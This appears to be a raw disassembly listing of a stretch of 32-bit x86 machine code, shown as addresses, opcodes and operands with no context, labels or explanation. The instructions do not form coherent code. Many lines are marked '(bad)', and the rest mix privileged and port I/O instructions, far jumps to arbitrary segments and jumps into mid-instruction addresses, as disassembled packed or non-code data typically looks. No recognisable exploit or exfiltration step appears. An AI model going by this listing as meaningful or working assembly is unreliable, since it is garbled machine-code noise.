  4117b6:	arpl   WORD PTR [ebp-0x2d],dx
  4117b9:	dec    edi
  4117ba:	test   eax,esp
  4117bc:	pop    ss
  4117bd:	les    edi,FWORD PTR [edx]
  4117bf:	adc    dh,dh
  4117c1:	dec    ebp
  4117c2:	xchg   edx,eax
  4117c3:	test   BYTE PTR [ebx+0x6acd2567],bl
  4117c9:	sub    al,0x41
  4117cb:	mov    ah,BYTE PTR [edx+0x60]
  4117ce:	leave  
  4117cf:	mov    edi,0x5daca4ab
  4117d4:	loope  0x4117ac
  4117d6:	clc    
  4117d7:	sar    BYTE PTR [eax+0x3da52fe3],0x64
  4117de:	mov    ecx,0x2e0dc76a
  4117e3:	and    ecx,DWORD PTR [edi+0x5d7d9200]
  4117e9:	sbb    BYTE PTR [eax+0x33],bl
  4117ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117ed:	jne    0x4117f2
  4117ef:	das    
  4117f0:	jne    0x411830
  4117f2:	sub    al,BYTE PTR [ecx+ebx*1]
  4117f5:	pop    esp
  4117f6:	sti    
  4117f7:	and    ah,dl
  4117f9:	mov    edx,DWORD PTR [ebx]
  4117fb:	push   ebx
  4117fc:	repz and DWORD PTR [edx-0x51],edx
  411800:	xlat   BYTE PTR ds:[ebx]
  411801:	add    ebx,edx
  411803:	lods   eax,DWORD PTR ds:[esi]
  411804:	and    BYTE PTR [esi-0x33e90a22],bh
  41180a:	ds push eax
  41180c:	sbb    eax,0xea705c02
  411811:	mov    eax,0x5d2dcd51
  411816:	jo     0x41188c
  411818:	pop    edi
  411819:	pop    ebx
  41181a:	lods   al,BYTE PTR ds:[esi]
  41181b:	and    DWORD PTR [edi+0x1f],0x53
  41181f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411820:	and    dl,BYTE PTR [edx+0x395e40ae]
  411826:	sub    al,0xa3
  411828:	cmp    eax,0xfd387776
  41182d:	loope  0x4117b1
  41182f:	lods   al,BYTE PTR ds:[esi]
  411830:	icebp  
  411831:	push   ebp
  411832:	and    esp,edx
  411834:	repnz bound edx,QWORD PTR [edi-0x737e9f26]
  41183b:	xchg   edx,eax
  41183c:	xchg   bh,ah
  41183e:	xchg   edx,eax
  41183f:	push   edx
  411840:	pusha  
  411841:	mov    bh,dl
  411843:	cmp    DWORD PTR [edx+0x3b8d59af],ecx
  411849:	mov    WORD PTR [ecx+0x7a861896],gs
  41184f:	stos   BYTE PTR es:[edi],al
  411850:	inc    edx
  411851:	je     0x4118a5
  411853:	mov    DWORD PTR [eax],ebx
  411855:	jmp    0x78bd:0xc1f69b2
  41185c:	stos   DWORD PTR es:[edi],eax
  41185d:	sub    eax,esi
  41185f:	mov    ah,0xb0
  411861:	rcl    DWORD PTR [ecx-0x37],cl
  411864:	pop    edi
  411865:	ja     0x4118a8
  411867:	lods   al,BYTE PTR ds:[esi]
  411868:	cli    
  411869:	loopne 0x4118c3
  41186b:	pop    ebp
  41186c:	std    
  41186d:	push   ds
  41186e:	push   ss
  41186f:	(bad)  
  411870:	mov    esp,0xab550e18
  411875:	repnz xchg edi,eax
  411877:	add    eax,0x2fd3943a
  41187c:	fcom   QWORD PTR [edx+ebp*1-0x77b5b313]
  411883:	imul   ebx,DWORD PTR [esi],0xffffffb0
  411886:	adc    al,0x72
  411888:	cmp    al,0xda
  41188a:	div    BYTE PTR [edx]
  41188c:	add    edi,DWORD PTR [ebp+0x7663a78a]
  411892:	data16 mov ah,0x55
  411895:	pop    ebp
  411896:	lahf   
  411897:	adc    al,BYTE PTR [edi+0x741e0d65]
  41189d:	repz inc eax
  41189f:	sbb    eax,DWORD PTR [eax]
  4118a1:	retf   0xab75
  4118a4:	pop    edi
  4118a5:	add    al,0x35
  4118a7:	push   edi
  4118a8:	push   edi
  4118a9:	jne    0x411861
  4118ab:	mov    edi,0x352cffd4
  4118b0:	push   ebp
  4118b1:	sub    DWORD PTR [edx+0x77],esp
  4118b4:	jo     0x411845
  4118b6:	out    dx,eax
  4118b7:	sub    edi,DWORD PTR [ebx+0x362b2453]
  4118bd:	sub    ecx,DWORD PTR [ebx+0x57470a6e]
  4118c3:	pop    ebp
  4118c4:	pop    eax
  4118c5:	sti    
  4118c6:	jle    0x411883
  4118c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118c9:	out    dx,eax
  4118ca:	add    eax,0xea4b71fd
  4118cf:	and    eax,0x81e16ba5
  4118d4:	cmp    eax,0x8082ac99
  4118d9:	js     0x4118ed
  4118db:	cmp    bh,BYTE PTR [esi]
  4118dd:	sbb    BYTE PTR [edi-0x2eec9380],bh
  4118e3:	inc    BYTE PTR [ecx-0x4d967569]
  4118e9:	pop    ecx
  4118ea:	jnp    0x41191e
  4118ec:	mov    ebx,0x2c836f4d
  4118f1:	push   ds
  4118f2:	jp     0x4118a6
  4118f4:	les    ecx,FWORD PTR [esi-0x59]
  4118f7:	out    dx,eax
  4118f8:	mov    al,ds:0x7c280500
  4118fd:	stc    
  4118fe:	xor    ecx,esi
  411900:	jl     0x41191e
  411902:	sbb    cl,BYTE PTR ds:0xd54ee3f0
  411908:	fucomp st(7)
  41190a:	sti    
  41190b:	sti    
  41190c:	ret    
  41190d:	inc    DWORD PTR [edi-0x53]
  411910:	mov    esi,0xde900a97
  411915:	loopne 0x41197e
  411917:	jo     0x411930
  411919:	mov    cl,BYTE PTR [ebp-0x2026d31f]
  41191f:	dec    bl
  411921:	jb     0x4118af
  411923:	imul   DWORD PTR [eax+0x312b4d17]
  411929:	(bad)  
  41192a:	(bad)  
  41192b:	leave  
  41192c:	xchg   ecx,eax
  41192d:	(bad)  
  41192e:	jg     0x4118c3
  411930:	and    ch,ah
  411932:	call   FWORD PTR [ecx-0x39934789]
  411938:	(bad)  
  411939:	bound  ecx,QWORD PTR [eax-0x103fad96]
  41193f:	sbb    DWORD PTR [ecx+0x75cc7e2e],ebx
  411945:	cs pushf 
  411947:	cmp    BYTE PTR [ecx],bh
  411949:	mov    esi,0x9e5e0c22
  41194e:	cmp    edi,DWORD PTR [ecx-0x7d]
  411951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411952:	push   ds
  411953:	inc    edx
  411954:	ret    
  411955:	push   edx
  411956:	or     eax,0xbd8b59ee
  41195b:	xchg   edi,eax
  41195c:	aam    0xbe
  41195e:	sti    
  41195f:	add    dl,cl
  411961:	in     eax,dx
  411962:	jmp    0xf185:0x87ec6c7b
  411969:	std    
  41196a:	imul   esp,DWORD PTR [esi],0x37237a47
  411970:	mov    ds:0x341b844a,al
  411975:	(bad)  
  411976:	iret   
  411977:	xchg   edi,eax
  411978:	xor    bl,BYTE PTR [edi+0x4e]
  41197b:	jmp    0x5559:0xf3efc66b
  411982:	ins    BYTE PTR es:[edi],dx
  411983:	pop    ss
  411984:	outs   dx,DWORD PTR ds:[esi]
  411985:	fidivr WORD PTR [ebx-0x3704dfee]
  41198b:	or     edi,esi
  41198d:	mov    es,WORD PTR [edx-0x4dea42b0]
  411993:	mov    ebx,0xa31bf190
  411998:	(bad)  
  411999:	test   eax,0xebd96f11
  41199e:	(bad)  
  41199f:	dec    ch
  4119a1:	sub    eax,DWORD PTR [ecx+0x1f]
  4119a4:	sbb    dl,bh
  4119a6:	jl     0x4119a1
  4119a8:	cmp    DWORD PTR [ebx-0x29],esi
  4119ab:	push   cs
  4119ac:	(bad)  
  4119ad:	adc    al,0x2d
  4119af:	mov    ebx,0xea7bebe6
  4119b4:	inc    edi
  4119b5:	gs jmp 0x4119c7
  4119b8:	test   eax,0x5d44331c
  4119bd:	sti    
  4119be:	lds    esi,FWORD PTR [ebp-0x26e7cc5d]
  4119c4:	lods   al,BYTE PTR ds:[esi]
  4119c5:	sub    edx,edi
  4119c7:	sub    bh,BYTE PTR [ecx+ebp*1]
  4119ca:	ins    BYTE PTR es:[edi],dx
  4119cb:	pop    ebp
  4119cc:	fsubr  DWORD PTR [ecx]
  4119ce:	sub    cl,BYTE PTR [edi-0x41]
  4119d1:	mov    edx,ecx
  4119d3:	sbb    BYTE PTR [esi],bh
  4119d5:	xchg   BYTE PTR [ecx],cl
  4119d7:	xchg   esi,eax
  4119d8:	int    0xd4
  4119da:	int3   
  4119db:	or     BYTE PTR [edi],al
  4119dd:	ins    BYTE PTR es:[edi],dx
  4119de:	cmp    BYTE PTR [ecx-0x3f19cd4c],0x80
  4119e5:	adc    ah,BYTE PTR [edx+0x10]
  4119e8:	(bad)  
  4119e9:	rol    DWORD PTR [eax+0x8f70d8b],cl
  4119ef:	inc    edi
  4119f0:	or     BYTE PTR [ecx],ch
  4119f2:	loop   0x4119d8
  4119f4:	xor    esp,DWORD PTR [eax+ebx*8]
  4119f7:	sub    DWORD PTR [ebx+ecx*8],ecx
  4119fa:	adc    BYTE PTR [esi-0x66050057],al
  411a00:	adc    al,0x9c
  411a02:	dec    esp
  411a03:	popf   
  411a04:	clc    
  411a05:	rcl    DWORD PTR [edi+0x7e],cl
  411a08:	retf   0x53f3
  411a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a0c:	mov    cl,0x46
  411a0e:	fdivr  st(1),st
  411a10:	imul   edi,ebp,0xffffff9f
  411a13:	popa   
  411a14:	dec    edi
  411a15:	dec    eax
  411a16:	jmp    0x411a2d
  411a18:	outs   dx,DWORD PTR ds:[esi]
  411a19:	sahf   
  411a1a:	ret    0x18b5
  411a1d:	xchg   DWORD PTR [ecx],edi
  411a1f:	mov    al,0x3c
  411a21:	xchg   ecx,eax
  411a22:	push   ebp
  411a23:	aad    0x14
  411a25:	mov    DWORD PTR [ebx-0x7c],ecx
  411a28:	jo     0x411a69
  411a2a:	jnp    0x411a12
  411a2c:	xor    eax,0xcdd6d7bc
  411a31:	in     eax,0xa4
  411a33:	mov    ds:0x7dace1bb,eax
  411a38:	dec    edx
  411a39:	lea    esi,[esi-0x51]
  411a3c:	leave  
  411a3d:	and    BYTE PTR [esi],dl
  411a3f:	sar    al,0xdd
  411a42:	clc    
  411a43:	je     0x411a4b
  411a45:	fsub   DWORD PTR [edx-0x68]
  411a48:	push   cs
  411a49:	std    
  411a4a:	push   eax
  411a4b:	lock jmp 0x411aa4
  411a4e:	mov    ah,0x92
  411a50:	jns    0x411a37
  411a52:	xchg   DWORD PTR [edx-0xdfb0a24],ecx
  411a58:	ds in  eax,dx
  411a5a:	xchg   bx,ax
  411a5c:	push   ss
  411a5d:	lds    eax,FWORD PTR [ebp-0x38]
  411a60:	mov    dl,0x16
  411a62:	fadd   QWORD PTR [ecx]
  411a64:	loope  0x411ad8
  411a66:	ds popa 
  411a68:	xchg   dl,cl
  411a6a:	out    0xe,al
  411a6c:	scas   al,BYTE PTR es:[edi]
  411a6d:	add    BYTE PTR [edx+0x33],dh
  411a70:	sbb    DWORD PTR [edi-0x1292c083],ebp
  411a76:	in     eax,dx
  411a77:	(bad)  
  411a78:	(bad)  
  411a79:	mov    eax,ds:0x7dd576fb
  411a7e:	add    DWORD PTR [esi-0x32],esi
  411a81:	mov    al,ds:0xad46da3e
  411a86:	adc    al,0x38
  411a88:	push   edi
  411a89:	rcl    BYTE PTR [ebp-0x2e],cl
  411a8c:	push   es
  411a8d:	(bad)  
  411a8e:	jge    0x411a41
  411a90:	dec    ax
  411a92:	mov    al,0xf3
  411a94:	cli    
  411a95:	repz js 0x411a2a
  411a98:	mov    ?,WORD PTR [edi]
  411a9a:	sbb    eax,0x90cf5d4f
  411a9f:	and    al,cl
  411aa1:	push   DWORD PTR [eax+edi*2]
  411aa4:	daa    
  411aa5:	sbb    ebp,DWORD PTR [esi+0x5b4532a6]
  411aab:	sub    BYTE PTR [ecx],ah
  411aad:	dec    edx
  411aae:	push   ecx
  411aaf:	cmp    eax,0x5122a97d
  411ab4:	pop    ebp
  411ab5:	aad    0xb5
  411ab7:	(bad)  
  411ab8:	dec    edi
  411ab9:	out    0xdc,eax
  411abb:	and    DWORD PTR [edx],esi
  411abd:	inc    esp
  411abe:	imul   ebp,DWORD PTR [edi],0x416b2452
  411ac4:	or     BYTE PTR [eax*8-0x7d83689b],ah
  411acb:	out    dx,eax
  411acc:	mov    ebx,0xcb511fca
  411ad1:	in     al,dx
  411ad2:	sbb    ah,BYTE PTR [eax]
  411ad4:	dec    ecx
  411ad5:	fistp  WORD PTR [edx-0x21]
  411ad8:	xchg   esp,eax
  411ad9:	rol    eax,cl
  411adb:	jbe    0x411a9d
  411add:	push   cs
  411ade:	cmp    dl,BYTE PTR [ecx]
  411ae0:	cli    
  411ae1:	sub    bl,dl
  411ae3:	stos   BYTE PTR es:[edi],al
  411ae4:	add    BYTE PTR [eax],ah
  411ae6:	ds stos BYTE PTR es:[edi],al
  411ae8:	dec    esp
  411ae9:	mov    eax,ds:0x5f4ed118
  411aee:	pop    eax
  411aef:	outs   dx,DWORD PTR ds:[esi]
  411af0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411af2:	sub    ah,BYTE PTR [edi+ecx*2]
  411af5:	mov    WORD PTR [eax-0x22],ss
  411af8:	cmp    eax,0x54a9c12f
  411afd:	int    0x61
  411aff:	es add eax,0xc9372d2e
  411b05:	add    dh,al
  411b07:	(bad)  
  411b08:	adc    DWORD PTR [esi+0x14],eax
  411b0b:	shl    BYTE PTR [ecx+0x4b799649],0x7c
  411b12:	mov    DWORD PTR [edx-0x7b],ebp
  411b15:	sbb    ebp,DWORD PTR [esi]
  411b17:	js     0x411b3c
  411b19:	jae    0x411b4c
  411b1b:	add    eax,0x99447822
  411b20:	hlt    
  411b21:	sbb    al,0x82
  411b23:	pop    eax
  411b24:	push   edx
  411b25:	(bad)  [esi+0x6e]
  411b28:	add    eax,DWORD PTR [edx+0x768f425]
  411b2e:	and    ebx,DWORD PTR [edx+ebp*8+0x75]
  411b32:	cld    
  411b33:	dec    edx
  411b34:	jp     0x411b7e
  411b36:	data16 sub bh,BYTE PTR [ecx-0x79ea2442]
  411b3d:	fs sub esi,esi
  411b40:	loop   0x411b0d
  411b42:	iret   
  411b43:	xor    DWORD PTR [esi+ecx*4-0x73],edx
  411b47:	xchg   edx,eax
  411b48:	mov    ds:0x30564c42,eax
  411b4d:	test   DWORD PTR [eax+0x46],ecx
  411b50:	stc    
  411b51:	ficom  DWORD PTR [edi+esi*1-0x342c2165]
  411b58:	pop    es
  411b59:	adc    DWORD PTR [ebp+0x60ee5f1c],ebp
  411b5f:	xchg   dh,dh
  411b61:	gs xor al,dh
  411b64:	mov    ch,0xbd
  411b66:	fbstp  TBYTE PTR [ecx-0x3]
  411b69:	mov    ?,WORD PTR [esi]
  411b6b:	test   al,0x3c
  411b6d:	test   cl,dh
  411b6f:	jmp    0x411b87
  411b71:	dec    edx
  411b72:	inc    ecx
  411b73:	icebp  
  411b74:	(bad)  
  411b75:	aaa    
  411b76:	retf   0x175a
  411b79:	mov    eax,0xc9d2e750
  411b7e:	aaa    
  411b7f:	mov    al,0xf
  411b81:	and    eax,eax
  411b83:	cmp    DWORD PTR [eax-0x2c],esp
  411b86:	pop    ds
  411b87:	hlt    
  411b88:	pop    eax
  411b89:	je     0x411ba2
  411b8b:	cmp    eax,0x2804d6ff
  411b90:	mov    ds:0xe6ee45ee,eax
  411b95:	sub    edi,DWORD PTR [edi-0x43]
  411b98:	retf   0x5a6d
  411b9b:	jo     0x411b61
  411b9d:	aaa    
  411b9e:	xlat   BYTE PTR ds:[ebx]
  411b9f:	mov    dh,0x6d
  411ba1:	lea    esi,[ebx+0x3c623bea]
  411ba7:	xlat   BYTE PTR ds:[ebx]
  411ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ba9:	mov    DWORD PTR [esi+edx*2],ebx
  411bac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bad:	adc    al,0xdd
  411baf:	pop    ecx
  411bb0:	es clc 
  411bb2:	into   
  411bb3:	lds    eax,FWORD PTR [esi+eax*2]
  411bb6:	and    al,0xc5
  411bb8:	push   ebp
  411bb9:	mov    edx,0x19b85154
  411bbe:	cmp    al,BYTE PTR ds:0x44f2c1b3
  411bc4:	imul   ebx,DWORD PTR [edx-0x60],0x5b
  411bc8:	mov    esi,0x7774e2ae
  411bcd:	fs mov cl,0x65
  411bd0:	shl    DWORD PTR [edi],cl
  411bd2:	(bad)  
  411bd3:	mov    bl,0x9c
  411bd5:	mov    cl,0xa9
  411bd7:	ret    0x68ba
  411bda:	push   cs
  411bdb:	ror    DWORD PTR [eax-0x1a],1
  411bde:	dec    edi
  411bdf:	push   esi
  411be0:	ret    
  411be1:	mov    ecx,0x324863a7
  411be6:	test   al,0xd3
  411be8:	outs   dx,BYTE PTR ds:[esi]
  411be9:	je     0x411c1b
  411beb:	ret    0x2f3b
  411bee:	xchg   edi,eax
  411bef:	xchg   DWORD PTR [esi+0x7b6e02ac],ecx
  411bf5:	nop
  411bf6:	repz pop esi
  411bf8:	int3   
  411bf9:	stc    
  411bfa:	or     BYTE PTR [ecx],0xd4
  411bfd:	jns    0x411b9f
  411bff:	sbb    DWORD PTR [edx-0x71],ecx
  411c02:	ret    0x247b
  411c05:	jp     0x411be5
  411c07:	imul   edi,DWORD PTR [ebx],0x2440d1a9
  411c0d:	inc    ecx
  411c0e:	mov    eax,0xdc8d50de
  411c13:	pop    esp
  411c14:	sub    eax,0xa29dd229
  411c19:	push   ds
  411c1a:	fiadd  DWORD PTR [edx-0x30]
  411c1d:	add    BYTE PTR [eax+0x4672f04a],bl
  411c23:	mov    bl,0x4
  411c25:	shr    al,cl
  411c27:	outs   dx,DWORD PTR ds:[esi]
  411c28:	mov    bh,0x22
  411c2a:	retf   0x7b5a
  411c2d:	dec    edx
  411c2e:	push   eax
  411c2f:	dec    edi
  411c30:	xchg   ebx,ecx
  411c32:	sub    al,0x24
  411c34:	test   al,0xe8
  411c36:	jecxz  0x411bbe
  411c38:	mov    ah,0xe2
  411c3a:	mov    ebp,0xdbace9ab
  411c3f:	push   ebp
  411c40:	in     al,dx
  411c41:	xor    BYTE PTR [ebx],al
  411c43:	aas    
  411c44:	lods   eax,DWORD PTR ds:[esi]
  411c45:	inc    eax
  411c46:	sar    DWORD PTR [ecx+0x3b],1
  411c49:	xor    cl,BYTE PTR [edi+edi*4+0x5b]
  411c4d:	fdiv   st,st(1)
  411c4f:	push   esi
  411c50:	inc    eax
  411c51:	enter  0x7d63,0xa5
  411c55:	shr    BYTE PTR [eax+0x9b472b5],cl
  411c5b:	hlt    
  411c5c:	(bad)  
  411c5d:	pop    es
  411c5e:	test   BYTE PTR [edi-0x4d366ba],bl
  411c64:	pop    ebp
  411c65:	mov    dh,0xfd
  411c67:	(bad)  
  411c68:	xchg   esi,eax
  411c69:	mov    dl,0x72
  411c6b:	stos   DWORD PTR es:[edi],eax
  411c6c:	stos   BYTE PTR es:[edi],al
  411c6d:	push   edi
  411c6e:	push   es
  411c6f:	push   ecx
  411c70:	xor    BYTE PTR [ebx-0x59d57a68],bh
  411c76:	adc    dl,BYTE PTR [eax]
  411c78:	and    eax,0x2aea9b7f
  411c7d:	sahf   
  411c7e:	sbb    DWORD PTR [ecx],0x3f
  411c81:	pop    ebp
  411c82:	push   ds
  411c83:	adc    esp,DWORD PTR ds:[eax]
  411c86:	push   ss
  411c87:	xchg   ecx,eax
  411c88:	jp     0x411c23
  411c8a:	pop    edi
  411c8b:	jb     0x411cf0
  411c8d:	add    BYTE PTR [ebx-0x65],0x17
  411c91:	and    ebx,edx
  411c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c94:	sbb    ch,cl
  411c96:	and    bh,BYTE PTR [edi]
  411c98:	sub    BYTE PTR [esi+0x16],ch
  411c9b:	xor    al,0xca
  411c9d:	xchg   esi,eax
  411c9e:	ds push ecx
  411ca0:	test   bh,al
  411ca2:	cmp    al,0x65
  411ca4:	adc    BYTE PTR [esi],al
  411ca6:	or     eax,DWORD PTR [ebx-0x3]
  411ca9:	jo     0x411cc1
  411cab:	xchg   DWORD PTR [ecx+ebp*4],edx
  411cae:	jns    0x411c39
  411cb0:	in     eax,dx
  411cb1:	mov    ch,BYTE PTR [ebp-0xe]
  411cb4:	sub    al,BYTE PTR es:[edx+0x43]
  411cb8:	(bad)  
  411cb9:	and    DWORD PTR [ecx],edx
  411cbb:	rcr    BYTE PTR [ebx],1
  411cbd:	shl    DWORD PTR [esi-0xe041d19],1
  411cc3:	int3   
  411cc4:	mov    BYTE PTR [ecx],cl
  411cc6:	sbb    ch,bh
  411cc8:	in     eax,dx
  411cc9:	mov    ecx,0x5060bd59
  411cce:	sbb    BYTE PTR [ecx],dl
  411cd0:	or     eax,DWORD PTR [eax]
  411cd2:	into   
  411cd3:	bswap  esp
  411cd5:	mov    dh,0xff
  411cd7:	dec    DWORD PTR [edx+0x6a4ab1e5]
  411cdd:	loope  0x411ce8
  411cdf:	ins    BYTE PTR es:[edi],dx
  411ce0:	loopne 0x411d60
  411ce2:	cmp    al,0x69
  411ce4:	jge    0x411cdf
  411ce6:	cmp    BYTE PTR [esi],dl
  411ce8:	fmul   st(1),st
  411cea:	fbstp  TBYTE PTR [ebp+0x222f3c34]
  411cf0:	pop    ebp
  411cf1:	out    dx,eax
  411cf2:	xchg   BYTE PTR [esi],cl
  411cf4:	in     eax,0xd5
  411cf6:	add    BYTE PTR [eax-0x44e3d8c5],bl
  411cfc:	inc    ecx
  411cfd:	enter  0xec15,0x31
  411d01:	in     eax,0xab
  411d03:	int    0x74
  411d05:	(bad)  
  411d06:	in     al,0xa0
  411d08:	push   cs
  411d09:	cmc    
  411d0a:	mov    al,0xc2
  411d0c:	jecxz  0x411d5d
  411d0e:	inc    ecx
  411d0f:	add    eax,0x123c99fa
  411d14:	sub    al,0x35
  411d16:	push   cs
  411d17:	jns    0x411cd9
  411d19:	xchg   ecx,eax
  411d1a:	repz pop esp
  411d1c:	mov    al,0x6c
  411d1e:	lahf   
  411d1f:	icebp  
  411d20:	test   BYTE PTR [ebp+0x2687ecc1],dh
  411d26:	push   eax
  411d27:	fcomp  DWORD PTR [eax-0x24]
  411d2a:	lsl    ebp,dx
  411d2d:	cli    
  411d2e:	mov    ebp,DWORD PTR [edx]
  411d30:	adc    al,0x5e
  411d32:	ret    0x43a9
  411d35:	mov    eax,ds:0x3ec9786
  411d3a:	scas   al,BYTE PTR es:[edi]
  411d3b:	xchg   ecx,eax
  411d3c:	pop    ecx
  411d3d:	push   esp
  411d3e:	cs mov cl,0xa2
  411d41:	call   0x21fa18e8
  411d46:	add    ebp,DWORD PTR [edx-0x21c9d973]
  411d4c:	add    eax,0x64bfeccd
  411d51:	mov    ch,0x6
  411d53:	jl     0x411d88
  411d55:	ss mov ecx,0x815dbdd1
  411d5b:	cmovae ecx,ebp
  411d5e:	int3   
  411d5f:	jecxz  0x411cee
  411d61:	push   edi
  411d62:	cwde   
  411d63:	push   0xffffffea
  411d65:	cmc    
  411d66:	rcr    BYTE PTR [esi],cl
  411d68:	retf   0x1d56
  411d6b:	ficomp DWORD PTR [esi]
  411d6d:	or     al,0xc
  411d6f:	shl    BYTE PTR [edi+0x4d3776e5],1
  411d75:	cld    
  411d76:	bound  ebp,QWORD PTR [edx+0x15ab01d0]
  411d7c:	pop    es
  411d7d:	pop    esi
  411d7e:	aad    0xe5
  411d80:	sub    DWORD PTR [ebx],edi
  411d82:	cwde   
  411d83:	(bad)  
  411d84:	xchg   edx,eax
  411d85:	add    ch,BYTE PTR [esi+0x67]
  411d88:	sbb    eax,0xa3b3086
  411d8d:	xor    al,0x3c
  411d8f:	adc    eax,DWORD PTR [edx-0x42]
  411d92:	mov    al,0xa6
  411d94:	fcomp  QWORD PTR [ebp-0x4bd8f933]
  411d9a:	jle    0x411d35
  411d9c:	mov    bh,0x9
  411d9e:	pop    edi
  411d9f:	jbe    0x411d33
  411da1:	sub    DWORD PTR [eax],edi
  411da3:	push   ebp
  411da4:	std    
  411da5:	call   0xffc1:0xdb92192f
  411dac:	cmp    eax,0x79ab6e32
  411db1:	xchg   ecx,eax
  411db2:	xchg   esi,eax
  411db3:	(bad)  
  411db4:	je     0x411d7a
  411db6:	push   es
  411db7:	cmp    DWORD PTR [ebx-0x1c],eax
  411dba:	jae    0x411daa
  411dbc:	test   DWORD PTR [ebx+0x2db85ebf],ecx
  411dc2:	pop    ecx
  411dc3:	nop
  411dc4:	fsubr  QWORD PTR [ebp+0x39]
  411dc7:	xor    dh,BYTE PTR [ecx+0x62d9e997]
  411dcd:	or     dl,ah
  411dcf:	inc    ecx
  411dd0:	cli    
  411dd1:	jnp    0x411d90
  411dd3:	leave  
  411dd4:	retf   
  411dd5:	ins    BYTE PTR es:[edi],dx
  411dd6:	cs loope 0x411e04
  411dd9:	aas    
  411dda:	pop    esp
  411ddb:	ja     0x411e4a
  411ddd:	xor    eax,0xb1b8906
  411de2:	cmp    cl,BYTE PTR [edx]
  411de4:	stos   BYTE PTR es:[edi],al
  411de5:	pop    eax
  411de6:	push   0x104c8fd2
  411deb:	arpl   WORD PTR [edx-0x36],cx
  411dee:	jmp    0x411e37
  411df0:	iret   
  411df1:	scas   al,BYTE PTR es:[edi]
  411df2:	xchg   edi,eax
  411df3:	mov    dl,bl
  411df5:	rcr    DWORD PTR [eax-0x10],1
  411df8:	pop    ebp
  411df9:	sub    edi,DWORD PTR [eax]
  411dfb:	fsubr  DWORD PTR [eax-0x6b]
  411dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dff:	sub    BYTE PTR [edx],dl
  411e01:	jecxz  0x411e21
  411e03:	sahf   
  411e04:	mov    dh,0x15
  411e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e07:	jno    0x1f617f02
  411e0d:	pop    edi
  411e0e:	mul    DWORD PTR [esi]
  411e10:	mov    edx,0xfee9126a
  411e15:	pop    edx
  411e16:	imul   ebp,DWORD PTR [ebp+0x3e787ca5],0x542a229e
  411e20:	or     al,0x7
  411e22:	inc    ebx
  411e23:	outs   dx,BYTE PTR ds:[esi]
  411e24:	sar    ebp,1
  411e26:	clc    
  411e27:	popa   
  411e28:	div    DWORD PTR [eax]
  411e2a:	and    al,0x1
  411e2c:	ins    BYTE PTR es:[edi],dx
  411e2d:	adc    BYTE PTR [ebx-0x400c926f],0xee
  411e34:	mov    ecx,0x76daf3e6
  411e39:	loop   0x411df1
  411e3b:	xor    dh,BYTE PTR [ecx-0x7c891c23]
  411e41:	jo     0x411e83
  411e43:	and    BYTE PTR ds:[esp+esi*2+0x25],bh
  411e48:	jp     0x411de5
  411e4a:	lds    edi,FWORD PTR [eax-0x42]
  411e4d:	jmp    0x411e80
  411e4f:	dec    esi
  411e50:	or     DWORD PTR [ebx-0x1cdf46eb],0xfffffff4
  411e57:	push   ebx
  411e58:	dec    esi
  411e59:	(bad)  
  411e5a:	jne    0x411e21
  411e5c:	outs   dx,BYTE PTR ds:[esi]
  411e5d:	clc    
  411e5e:	ret    0xe302
  411e61:	mov    ebp,0x4530cd09
  411e66:	sbb    DWORD PTR [esi+0x11babcd5],eax
  411e6c:	out    0xaa,al
  411e6e:	ficom  WORD PTR [edx-0x4a1ed579]
  411e74:	cmp    eax,0xb940cedd
  411e79:	fisub  WORD PTR [ecx+0x13]
  411e7c:	shl    BYTE PTR [ebx-0x6a],1
  411e7f:	mov    DWORD PTR [esi+0x61a59bd2],edx
  411e85:	push   ebp
  411e86:	clc    
  411e87:	mov    eax,0x9c156b47
  411e8c:	xchg   BYTE PTR [eax-0x4f],ch
  411e8f:	jle    0x411e90
  411e91:	jae    0x411e80
  411e93:	(bad)  
  411e94:	cs add eax,0xb6d15508
  411e9a:	cli    
  411e9b:	adc    dh,BYTE PTR [eax+0x7c]
  411e9e:	dec    eax
  411e9f:	sub    esp,DWORD PTR [eax]
  411ea1:	stos   DWORD PTR es:[edi],eax
  411ea2:	mov    ebx,0x3ee63a45
  411ea7:	(bad)  
  411ea8:	stc    
  411ea9:	test   eax,0x116fbff6
  411eae:	scas   eax,DWORD PTR es:[edi]
  411eaf:	mov    edx,0xc7706517
  411eb4:	adc    edx,DWORD PTR [eax]
  411eb6:	push   0xffffff99
  411eb8:	call   0xff33:0x1a420a1a
  411ebf:	call   0x1d66:0x5789411f
  411ec6:	jno    0x411ecf
  411ec8:	inc    ecx
  411ec9:	repz xor dl,al
  411ecc:	adc    al,0x81
  411ece:	adc    ah,ch
  411ed0:	add    al,0x99
  411ed2:	and    al,0xa6
  411ed4:	loop   0x411e68
  411ed6:	not    BYTE PTR [eax+0x62052b84]
  411edc:	hlt    
  411edd:	or     eax,0x7e40fd40
  411ee2:	dec    ebp
  411ee3:	fwait
  411ee4:	fs dec esp
  411ee7:	xchg   BYTE PTR es:[ebp+ebx*2-0x1210659a],cl
  411eef:	jne    0x411f0d
  411ef1:	dec    esi
  411ef2:	ins    DWORD PTR es:[edi],dx
  411ef3:	repnz bound esp,QWORD PTR [ecx]
  411ef6:	hlt    
  411ef7:	mov    dl,0x7a
  411ef9:	mov    ds:0xa6e960b1,eax
  411efe:	xor    ecx,esp
  411f00:	repz push edi
  411f02:	sbb    BYTE PTR [edx-0x2a919f03],ch
  411f08:	fwait
  411f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f0a:	or     al,0xd2
  411f0c:	in     eax,0xd3
  411f0e:	ret    0x5a5f
  411f11:	into   
  411f12:	leave  
  411f13:	xor    DWORD PTR [edi-0x57f3daec],0x5e1f3e7d
  411f1d:	ret    0x30fd
  411f20:	adc    al,0x96
  411f22:	jp     0x411ef9
  411f24:	hlt    
  411f25:	mov    DWORD PTR [ebp-0x5d],eax
  411f28:	(bad)  
  411f29:	mov    ah,0x1f
